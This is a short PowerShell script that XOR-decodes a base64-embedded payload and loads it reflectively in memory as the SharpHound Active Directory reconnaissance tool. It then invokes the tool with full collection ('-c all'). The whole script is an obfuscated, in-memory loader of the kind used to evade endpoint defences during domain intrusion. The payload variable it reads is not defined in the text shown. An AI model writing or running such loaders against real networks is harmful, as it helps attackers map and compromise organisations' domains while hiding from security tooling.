function Load-XLdr_SharpHound { param([Parameter ()] $xk = "0x64")
$loadedAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.Fullname -eq "SharpHound, Version=2.3.1.0, Culture=neutral, PublicKeyToken=null" }
if ($loadedAssembly) {
  return $loadedAssembly[0]  
}
$xk -eq "" -and ($xk = Read-Host "Specify XorKey")
$fb = [Convert]::FromBase64String($3ab48c63)
for($i=0; $i -lt $fb.count ; $i++) {$fb[$i] = $fb[$i] -bxor $xk}
$asm_XLdr_SharpHound = [System.Reflection.Assembly]::Load($fb)
return $asm_XLdr_SharpHound
}
function Invoke-XLdr_SharpHound { param([Parameter ()] $Params = "-c all")
$asm = Load-XLdr_SharpHound
$Params -eq "" -and ($Params = Read-Host "Specify command arguments")
$asm.EntryPoint.Invoke($null, (, $Params.split()))
}